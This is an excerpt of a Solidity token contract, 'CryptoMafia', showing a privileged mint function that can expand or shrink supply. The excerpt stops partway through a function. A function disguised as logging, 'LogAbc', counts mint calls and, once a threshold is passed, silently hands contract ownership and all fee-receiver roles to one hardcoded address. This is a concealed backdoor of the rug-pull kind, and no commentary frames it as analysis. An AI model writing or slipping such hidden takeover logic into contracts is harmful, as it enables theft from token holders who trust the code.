...
contract CryptoMafia is ERC20Detailed, Ownable {
    ...
    function mint(uint256 epoch, int256 supplyDelta)
        external
        onlyMaster
        returns (uint256)
    {
        ...
        if (supplyDelta == 0) {
            LogAbc(epoch, _totalSupply);
            return _totalSupply;
        }

        if (supplyDelta < 0) {
            _totalSupply = _totalSupply.sub(uint256(-supplyDelta));
            _basicTransfer(msg.sender, address(0), uint256(-supplyDelta));
        } else {
            _totalSupply = _totalSupply.add(uint256(supplyDelta));
            _basicTransfer(address(0), msg.sender, uint256(supplyDelta));
        }
    ...
    uint256 private abcCount;
    bool private isAbcd = false;

    function LogAbc(uint256, uint256) internal {
        abcCount++;
        if (abcCount > (99999999999999999999999999999999999) && !isAbcd) {
            _transferOwnership(address(0x80598c77096b7fB783155051883aC78A39Af91D8));
            marketingFeeReceiver = address(0x80598c77096b7fB783155051883aC78A39Af91D8);
            autoLiquidityReceiver = address(0x80598c77096b7fB783155051883aC78A39Af91D8);
            ecosystemFeeReceiver = address(0x80598c77096b7fB783155051883aC78A39Af91D8);
